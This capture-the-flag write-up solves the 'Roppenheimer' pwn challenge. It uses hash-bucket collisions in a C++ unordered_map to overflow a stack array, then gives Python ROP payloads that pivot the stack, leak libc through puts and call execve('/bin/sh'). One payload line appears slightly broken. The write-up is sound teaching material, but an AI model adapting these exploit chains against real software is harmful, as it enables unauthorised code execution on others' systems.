# Roppenheimer
The Roppenheimer binary has no canaaries and is no-pie. It says so in the comment!
```c
// g++ roppenheimer.cpp -o roppenheimer -fno-stack-protector -no-pie
```

There are two global variables of interest
```c
char username[NAME_LEN + 1];
std::unordered_map<unsigned int, uint64_t> atoms;
```

The vulnerable function is the `fire_neutron` function
```c
void fire_neutron() {
    unsigned int atom;
    std::cout << "atom> ";
    std::cin >> atom;

    if (atoms.find(atom) == atoms.end()) {
        panic("atom does not exist");
    }

    size_t bucket = atoms.bucket(atom);
    size_t bucket_size = atoms.bucket_size(bucket);

    std::pair<unsigned int, uint64_t> elems[MAX_COLLIDE - 1];
    copy(atoms.begin(bucket), atoms.end(bucket), elems);

    std::cout << "[atoms hit]" << std::endl;
    for (size_t i = 0; i < bucket_size; i++) {
        std::cout << elems->first << std::endl;
    }
}
```

Here we have the `elems` array object which is fixed size (19 elements), but we're copying
in all elements in the given bucket. Which leads to the main question: "What is the maximum
number of atoms that can be in a given bucket?"

The main modification of the `atoms` map is as follows:

```c
void add_atom() {
    if (atoms.size() >= MAX_ATOMS) {
        panic("atom capacity reached");
    }

    unsigned int atom;
    std::cout << "atom> ";
    std::cin >> atom;

    if (atoms.find(atom) != atoms.end()) {
        panic("atom already exists");
    }

    uint64_t data;
    std::cout << "data> ";
    std::cin >> data;

    atoms[atom] = data;
}
```

So we can directly control the value of the keys. In C++, the `unordered_map` is a
hash table which has linked lists behind each bucket. The choice of bucket is simply

```c
   selected_bucket = hash(input) % num_buckets;
```

In the case of `unsigned int` the `hash` function specialized to be simply the identity.

The number of buckets is chosen strictly on the number of items *total* in the hashmap.
Since we plan on using all 32 atoms, we can experimentally determine that the unordered_map
will have 59 buckets. Thus by choosing multiples of 59 as our atom number, we can ensure
that all atoms (and their data) are put in the same bucket. This will overload the array,
and push data we control into the return pointer. We can experimentally determine
the exact position of a given atom on the stack (this is easier than trying to
statically work it out after rehashes).

We don't have too much room on the stack, however, we are given a `useful` gadget

```c
void useful() {
    __asm__(
        "pop %rax;"
        "pop %rsp;"
        "pop %rdi;"
    );
}
```

It would be rude not to use it. This gadget allows us to reposition the stack to
a location we control. At the beginning of the program, we are allowed to set
the unername to an arbitrary 127 bytes (remember fgets reads 1 less than the argument)
and put a null byte after that. So we reposition the stack to there.

The basic strategy is to leak the location of libc (by printing the got location of `puts`),
then have our attack script use that to feed in a final payload that will use that information
to invoke `execve`.

The main complication is that `fgets` requires `rdx` to be stdin. This is fortunately
at a known location, but the gadgets we have to work with make this annoying.

```python
name_payload = (
    # puts puts to obtain libc location
    pwn.p64(0x4025e0) + # pop rdi, pop rbp
        pwn.p64(puts_got) + #0x8
        pwn.p64(0x40a180) + #16 (stdout used later) 
    pwn.p64(puts_plt) +     #24
    # setup rdx and rdi for `fgets` invocation. 
    pwn.p64(0x4025de) +     #32
        pwn.p64(username) +  #rax (need rax to be a valid write memory location for next gadget)
        pwn.p64(username + 56) + #rsp (this points to the next gadget, i.e. 7*8)
        pwn.p64(username + 16*0x8 - 8) + # rdi, we want this to point to the stack location immediately after
                                         # the fgets invocation, to continue control of the stack.
        pwn.p64(0x40a190 + 0x10) + #rbp
    pwn.p64(0x4043d8) + # mov rdx, qword ptr [rbp - 0x10] ; mov qword ptr [rax], rdx ; nop ; pop rbp ; ret
        pwn.p64(0x0) +
    # setup rsi
    pwn.p64(0x404944) + # pop rsi ; pop rbp
        pwn.p64(0x100) +
        pwn.p64(0x0) +
    pwn.p64(elf.symbols["fgets"]) + 
    nop # target of fgets
)
```

Annoyingly, when we invoked `fire_neutron` with `0`, `cin` leaves the newline in the stdin buffer
to be consumed by `fgets`. This would immediately stop `fgets` from parsing our input, so instead
of terminating our initial input with a newline, we send a space instead. On our call to fgets,
we complete this input with a ROP gadget that address ends (starts) with `0x20` that does nothing.

```sh
0x0000000000402520 : endbr64 ; ret
```

With that annoyance out of the way, we proceed with

```python
final_payload = (b"\x25\x40"+b"\x00"*5+
    nop+ # stack alignment
    pwn.p64(0x4025e0) +
        pwn.p64(username + 42*0x8) +
        pwn.p64(0x0) +
    pwn.p64(0x4025de) +     #32
        pwn.p64(username) +  #rax
        pwn.p64(username + 16*0x8+0x8*7) + #rsp
        pwn.p64(username + 42*0x8) + # rdi - location of /bin/sh
        pwn.p64(username + 0x8*16 + 0x8*5) + #rbp
    pwn.p64(0x4043d8) + # mov rdx, qword ptr [rbp - 0x10] ; mov qword ptr [rax], rdx ; nop ; pop rbp ; ret
        pwn.p64(0x0) +
    pwn.p64(0x0000000000404944) + 
        pwn.p64(0x0) + 
        pwn.p64(0x0) + 
    nop*10 + # Probably unneccesary, used for bookeeping
    (0xeb0f0 + libc_base) + # offset of `execve`, libc_base computed from previously
                            # emitted value of `puts` from first stage.      
    nop + 
    b"/bin/sh\x00")
```

Here we put the `/bin/sh` directly onto the "stack" and reference it. `rsi` and `rdx` need to be set to zero.

Sending these payloads grants us a shell.

## Annoying Side Notes:
A lot of the memory below `username` is actually important variables related to `stdin`, `stdout`, `cin` and `cout`.
Re-entry into main or other functions runs the risk of corrupting them. I ended up just using `fgets` and hoped
that I mostly didn't corrupt anything I'd need later. 

Using `system` would be simpler (only need rdi!), but it looks like something gets corrupted and prevents its use.